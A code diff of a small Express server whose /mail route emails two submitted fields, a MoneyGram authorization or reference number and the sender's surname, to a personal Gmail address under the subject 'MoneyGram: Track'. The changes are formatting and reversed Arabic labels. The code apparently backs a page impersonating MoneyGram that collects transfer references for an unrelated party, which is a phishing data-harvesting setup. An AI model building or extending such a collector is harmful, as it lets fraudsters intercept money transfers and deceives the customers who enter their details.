@@ -12,7 +12,8 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static(join(__dirname, 'public')));
 
-app.post('/mail', async (req, res) => {
+app.post('/mail', async (req, res) =>
+{
   const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
@@ -27,16 +28,16 @@ app.post('/mail', async (req, res) => {
       to: 'oemad7744@gmail.com',
       subject: 'MoneyGram: Track',
       text: `
-      <h1>MoneyGram</h1>
-      <bdo dir="rtl"><strong>رقم التخويل أو الرقم المرجعي</strong>: ${req.body.in1}</bdo>
+      <h1>MoneyGram</h1> 
+      <bdo dir="rtl"><strong>يعجرملا مقرلا ليوختلا مقر</strong>: ${req.body.in1}</bdo>
       <br />
-      <bdo dir="rtl"><strong>شهرتك</strong>: ${req.body.in2}</bdo>
+      <bdo dir="rtl"><strong> كترهش </strong>: ${req.body.in2}</bdo>
       `,
       html: `
         <h1>MoneyGram</h1>
-        <bdo dir="rtl"><strong>رقم التخويل أو الرقم المرجعي</strong>: ${req.body.in1}</bdo>
+        <bdo dir="ltr"><strong>يعجرملا مقرلا ليوختلا مقر</strong>: ${req.body.in1}</bdo>
         <br />
-        <bdo dir="rtl"><strong>شهرتك</strong>: ${req.body.in2}</bdo>
+        <bdo dir="ltr"><strong>كترهش</strong>: ${req.body.in2}</bdo>
         `,
     });
 
@@ -47,7 +48,8 @@ app.post('/mail', async (req, res) => {
   }
 });
 
-app.listen(app.get('PORT'), () => {
+app.listen(app.get('PORT'), () =>
+{
   console.log(
     `the server is running on: http://${app.get('HOSTNAME')}:${app.get(
       'PORT',
